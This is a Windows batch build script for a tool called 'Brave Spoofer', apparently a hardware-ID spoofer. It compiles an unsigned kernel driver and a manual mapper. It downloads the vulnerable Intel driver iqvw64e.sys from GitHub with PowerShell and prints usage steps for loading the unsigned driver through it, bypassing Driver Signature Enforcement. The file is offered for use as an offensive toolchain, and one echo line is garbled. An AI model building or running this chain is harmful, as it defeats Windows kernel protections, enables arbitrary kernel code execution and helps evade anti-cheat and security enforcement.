@echo off
chcp 65001 >nul
title Brave Spoofer - Complete Build System
color 0A

:: ============================================
:: Brave Spoofer - Build Script
:: DSE Bypass Driver + Mapper
:: ============================================

setlocal enabledelayedexpansion

:: Check for admin
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Run as Administrator!
    pause
    exit /b 1
)

:: Set paths
set "SCRIPT_DIR=%~dp0"
set "BIN_DIR=%SCRIPT_DIR%bin"
set "DRIVER_DIR=%SCRIPT_DIR%driver"
set "MAPPER_DIR=%SCRIPT_DIR%mapper"

:: Create bin directory
if not exist "%BIN_DIR%" mkdir "%BIN_DIR%"

:: ============================================
:: STEP 1: Find WDK and Visual Studio
:: ============================================
echo [*] Searching for WDK...

:: Try to find WDK automatically
set WDK_PATH=
for /f "tokens=*" %%i in ('where /r "C:\Program Files" Inc\km.h 2^>nul') do (
    set "WDK_PATH=%%~dpi..\.."
    goto :found_wdk
)

:found_wdk
if not defined WDK_PATH (
    echo [!] WDK not found in default locations
    echo     Please install Windows Driver Kit (WDK) first
    echo     Download: https://go.microsoft.com/fwlink/?linkid=2249371
    pause
    exit /b 1
)

echo [+] WDK found: %WDK_PATH%

:: ============================================
:: STEP 2: Setup Visual Studio Environment
:: ============================================
echo [*] Setting up Visual Studio environment...

call "%VSINSTALLDIR%\VC\Auxiliary\Build\vcvars64.bat" >nul 2>&1
if %errorlevel% neq 0 (
    echo [!] Visual Studio not found
    echo     Please install Visual Studio 2022 with Desktop C++ workload
    pause
    exit /b 1
)

:: Find WDK include path
for /d %%I in ("%WDK_PATH%\Include\10.*") do set "KITVER=%%~nxI"
set "KITINC=%WDK_PATH%\Include\%KITVER%"
set "KITLIB=%WDK_PATH%\Lib\%KITVER%\km\x64"

:: Set environment
set "INCLUDE=%KITINC%\km;%KITINC%\shared;%KITINC%\km\crt;%INCLUDE%"
set "LIB=%KITLIB%;%LIB%"

echo [+] Environment configured

:: ============================================
:: STEP 3: Build Driver (UNSIGNED - DSE Bypass)
:: ============================================
echo [*] Building driver...
cd /d "%DRIVER_DIR%"

msbuild driver.vcxproj /p:Configuration=Release /p:Platform=x64 /p:OutDir=%BIN_DIR%\ /nologo /m
if %errorlevel% neq 0 (
    echo [!] Driver build failed
    cd /d "%SCRIPT_DIR%"
    pause
    exit /b 1
)

echo [+] Driver built: %BIN_DIR%\BraveSpoof.sys (UNSIGNED - DSE Bypass ready)

:: ============================================
:: STEP 4: Build Mapper
:: ============================================
echo [*] Building mapper...
cd /d "%MAPPER_DIR%"

msbuild mapper.vcxproj /p:Configuration=Release /p:Platform=x64 /p:OutDir=%BIN_DIR%\ /nologo /m
if %errorlevel% neq 0 (
    echo [!] Mapper build failed
    cd /d "%SCRIPT_DIR%"
    pause
    exit /b 1
)

echo [+] Mapper built: %BIN_DIR%\mapper.exe

:: ============================================
:: STEP 5: Download Intel Exploit Driver
:: ============================================
echo [*] Downloading Intel exploit driver...
cd /d "%BIN_DIR%"

:: Try to download iqvw64e.sys
powershell -command "Invoke-WebRequest -Uri 'https://github.com/Ch0pin/medusa/raw/master/iqvw64e.sys' -OutFile 'iqvw64e.sys'" 2>nul
if exist "iqvw64e.sys" (
    echo [+] Intel driver downloaded: %BIN_DIR%\iqvw64e.sys
) else (
    echo [WARN] Failed to download iqvw64e.sys
    echo        You must place iqvw64e.sys in the bin\ folder manually
)

:: ============================================
:: STEP 6: Verify Files
:: ============================================
echo.
echo ============================================
echo         BUILD COMPLETE - DSE BYPASS READY
echo ============================================
echo.
echo Files location: %BIN_DIR%\necho.

cd /d "%BIN_DIR%"
dir /b

echo.
echo ============================================
echo         USAGE INSTRUCTIONS
echo ============================================
echo.
echo 1. Run as Administrator:
    echo    cd /d "%BIN_DIR%"
    echo    mapper.exe BraveSpoof.sys iqvw64e.sys
echo.
echo 2. OR use interactive menu:
    echo    cd /d "%BIN_DIR%"
    echo    mapper.exe
echo.
echo 3. The driver uses DSE bypass via iqvw64e.sys
    echo    No signature required!
echo.
echo ============================================
echo.

cd /d "%SCRIPT_DIR%"
pause
